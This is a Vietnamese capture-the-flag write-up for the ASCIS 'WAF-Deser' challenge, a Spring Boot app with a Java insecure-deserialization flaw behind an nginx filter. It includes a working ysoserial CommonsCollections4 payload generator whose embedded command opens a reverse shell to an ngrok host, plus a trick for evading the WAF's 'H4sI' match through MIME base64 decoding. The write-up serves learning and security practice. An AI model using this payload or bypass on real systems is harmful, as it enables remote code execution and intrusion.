# ASCIS QUALS - WAF-Deser

<img width="752" alt="11_08_40-ASCIS - QUALS" src="https://user-images.githubusercontent.com/71699412/196037859-c1152fb2-be4a-4a89-9e6e-e6e3eb133633.png">

Source code: https://drive.google.com/file/d/1wxbVU11RIqD_RTtAcrIQGB82ihAxX06q/view?usp=sharing

## Review Source Code
Sau khi giải nén mình được 1 file jar + nginx.conf + docker file. 

Đọc file Docker thì có thể thấy mình cần RCE và thực thi file `/readflag` thì mới có thể đọc flag, file jar thì chạy jdk 11. Server này cũng nằm sau 1 nginx proxy firewall với các rule check, mình sẽ phân tính kĩ hơn ở sau.

Mở Intellij lên thư mục vừa giải nén và add file `waf-deser-0.0.1-SNAPSHOt.jar` as library, bằng cách này ta có thể xem được source code java mà không cần phải decompile ra.

<img width="340" alt="11_17_18-" src="https://user-images.githubusercontent.com/71699412/196037462-2ac5d487-61f6-43d1-9a02-80077dc9cb7c.png">

Xem qua ta có thể thấy server chạy Spring Boot và Controller chính `UserController` nằm ở package `vcs.example.wafdeser`.

<img width="210" alt="11_20_01-src – UserController class  waf-deser-0 0 1-SNAPSHOT (2)" src="https://user-images.githubusercontent.com/71699412/196037477-6300cc04-aef8-4c13-a85f-92dcb636695f.png">

**Class UserController**:
```java
public class UserController {
    public UserController() {
    }

    @GetMapping({"/"})
    public String sayHello() {
        return String.format("Hello ASCIS");
    }

    @RequestMapping(
        value = {"/info/{info}"},
        method = {RequestMethod.GET}
    )
    public String getUser(@PathVariable("info") String info, @RequestParam(name = "compress",defaultValue = "false") Boolean isCompress) throws IOException {
        String unencodedData = this.unEncode(info);
        String returnData = "";
        byte[] data = Base64.getMimeDecoder().decode(unencodedData);
        if (isCompress) {
            InputStream is = new ByteArrayInputStream(data);
            InputStream is = new GZIPInputStream(is);
            ObjectInputStream ois = new ObjectInputStream(is);

            try {
                User user = (User)ois.readObject();
                returnData = user.getName();
                ois.close();
            } catch (Exception var9) {
                returnData = "?????";
            }
        } else {
            returnData = new String(data, StandardCharsets.UTF_8);
        }

        return String.format("Hello %s", returnData);
    }

    private String unEncode(String s) {
        return s.replaceAll("-", "\\r\\n").replaceAll("%3D", "=").replaceAll("%2B", "\\+").replaceAll("_", "/");
    }
}
```
**Phân tích**: Ở route `/info/{info}` có method `readObject()` deserialize object từ user input là đáng chú ý, mình xin phân tích route này như sau:
1. Data của biến `info` được lấy từ uri path ứng với: `/info/{info}` nhờ annotation @PathVariable.
2. Biến `info` này sau đó được replace lại 1 số kí tự bằng method `unEncode()` và sẽ được base64 decode.
3. Ở đây nếu param `compress` được set là `true` thì `info` sẽ được nạp dưới dạng là 1 object stream được nén gzip và cuối cùng sẽ được deserialize ở method `readObject()`.

Đây rõ ràng là lỗ hổng `Java Insecure Deserialization`, để exploit thì điều tiếp theo mình cần làm là tìm là 1 sink mà có thể dẫn đển RCE khi deserialize object.

Tìm đến file `pom.xml`, là file chứa thông tin để build java app thì mình thấy được server có dùng `Commons Collection 4` version `4.0`. CC4 version 4.0 có [CVE](https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHECOMMONS-30008) chứa gadget chain có thể dẫn đến RCE khi insecure deserialize obj.

<img width="710" alt="11_14_41-src – pom xml  waf-deser-0 0 1-SNAPSHOT (2)" src="https://user-images.githubusercontent.com/71699412/196037828-17f99c3f-fff4-431e-9f30-4ca793b1ac17.png">

## Exploit
Đến đây mình biết cần sử dụng gadget chain CC4 để exploit RCE, gadget này đã có sẵn trong tool ysoserial, ở Intellij mình có thể tạo 1 project Java và add `ysoserial.jar` as a library là có thể dùng được method tạo gadget có sẵn. Sau khi serialize gadget này, mình cần nén gzip lại rồi base64 encode cũng như replace lại luôn 1 số kí tự như ở server để gửi đi ở uri path mà không gây lỗi.

**Script gen payload**:
```java
import ysoserial.payloads.CommonsCollections4;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.zip.GZIPOutputStream;

public class Exploit {

    private static String unEncode(String s) {
        return s.replaceAll("-", "\\r\\n").replaceAll("%3D", "=").replaceAll("%2B", "\\+").replaceAll("_", "/");
    }

    private static String encodeB(String s) {
        return s.replaceAll("\\r\\n", "-").replaceAll("=", "%3D").replaceAll("\\+", "%2B").replaceAll("/", "_");
    }

    public static final int bufferSize = 1024;

    public static void gZipFile(String inputPath, String outputPath) throws Exception {

        FileInputStream fis = new FileInputStream(inputPath);
        FileOutputStream fos = new FileOutputStream(outputPath);
        GZIPOutputStream gos = new GZIPOutputStream(fos);
        byte[] buffer = new byte[bufferSize];

        try{
            int len;
            while((len = fis.read(buffer)) != -1) {
                gos.write(buffer, 0, len);
            }
        } finally {
            try{if(fis != null) fis.close();} catch(Exception e){}
            try{if(gos != null) gos.close();} catch(Exception e){}
        }
    }

    public static void main(String[] args) {
        try {
            // Serialize CommonsCollection4 RCE gadget chain từ ysoserial.
            CommonsCollections4 cc4 = new CommonsCollections4();
            Object obj = cc4.getObject("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5hcC5uZ3Jvay5pby8xMzk5MiAwPiYx}|{base64,-d}|{bash,-i}"); // command lấy reverse shell.
            FileOutputStream fos = new FileOutputStream("cc4.txt");
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            oos.writeObject(obj);

            // Compress thành file gzip
            gZipFile("cc4.txt", "cc4.txt.gz");

            // Lấy dữ liệu từ file gzip và thực hiện encode
            byte[] bytes = Files.readAllBytes(Paths.get("cc4.txt.gz"));
            String a =  Base64.getEncoder().encodeToString(bytes);
            System.out.println(encodeB(a));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
```

**Lưu ý**: 
1. Server(docker) không có các tool như curl, ping, nc,... nên không thể sử dụng để lấy luôn flag được, phải lấy được shell.
2. Method `getObject()` khi tạo payload CC4 nhận arg command dưới dạng là 1 string, cái mà sẽ được nạp vào method `Runtime.getRuntime.exec(string)` để thực thi command. Mà method [exec(string) trong Java sẽ tự động split string dựa vào dấu space thành 1 string array](https://askcodes.net/coding/why-does-runtime-exec-string--work-for-some-but-not-all-commands-) để pass như các command arguments cho nên chỗ command này mình cần escape dấu space. 
2. `Runtime.getRuntime.exec()` có nhiều hạn chế hơn 1 shell bình thường nên 1 số ký tự, command không thể intepret hay escape nên ví dụ với command `bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/13992 0>&1` có chứa `>&` thì cần được escape nên mình base64 encode luôn đoạn này và nạp vào bash.

![unknown](https://user-images.githubusercontent.com/71699412/196038602-0b373191-5a43-46db-9487-cbd9c684a216.png)

Đến đây nếu gửi luôn payload lên server thì sẽ bị trả về: ` 403: Deserialization of Untrusted Data Detected. (From real WAF with <3)` do firewall mình đã nhắc ở trên.

## Bypass
**nginx.conf**:
```
server {    
    listen 80;

    large_client_header_buffers 4 3000; # Limit URI length upto 3000 bytes

    location ~* H4sI {
        return 403 'Deserialization of Untrusted Data Detected. (From real WAF with <3)';
    }

    location / {
        proxy_set_header   X-Forwarded-For $remote_addr;
        proxy_set_header   Host $http_host;
        proxy_pass         "http://web:8080";
    }

}
```
`H4sI` là đoạn base64 encode của magic byte + mode compress của file gzip. Mình có ngồi cố sửa byte header để khi base64 encode sẽ khác đi nhằm bypass nhưng không ăn thua cho đến khi mình thử fuzz chèn dấu space vào giữa thì lại bypass được. Ngoài dấu space thì các ký tự còn lại theo mình thử thì nếu khác null hay khác chứ cái + chữ số thì đều có thể bypass được - chưa hiểu tại sao không gây lỗi khi nạp gzip. Sau khi giải kết thúc mình tìm hiểu thêm mới để ý ở dây server dùng [Base64.getMimeDecoder()](https://docs.oracle.com/javase/8/docs/api/java/util/Base64.html#getMimeEncoder--) để decode đoạn base64. Mà [MIME type base64 encoding scheme](https://docs.oracle.com/javase/8/docs/api/java/util/Base64.html#mime) sẽ tự động bỏ qua các ký tự không thuộc [The Base64 Alphabet](https://www.ietf.org/rfc/rfc2045.txt) nên khi chèn các kí tự đặc biệt vào giữa đoạn `H4sI` có thể bypass firewall mà không gây lỗi.

Ở đây firewall cũng check uri size chỉ được phép bé hơn 3000 bytes nhưng khi compress và base64 encode payload mình không gặp vấn đề nào về size limit dù ở đây không có size limit thì vẫn phải gzip payload lại để không bị lỗi.

Send payload lên server:

<img width="853" alt="14_23_55-Burp Suite Professional v2022 8 1 - Temporary Project - licensed to google" src="https://user-images.githubusercontent.com/71699412/196037867-e44a3c6f-963b-4096-b3f1-e7cd0309539c.png">

Reverse shell trả về và đọc flag:

<img width="449" alt="14_24_21-" src="https://user-images.githubusercontent.com/71699412/196037919-761e9840-339e-4c83-81e2-a1c18afcc50a.png">

**Flag**: `ASCIS{0H_Mime_B@s364!T1me_2_le4rN_Seri0U5ly!!!!}`
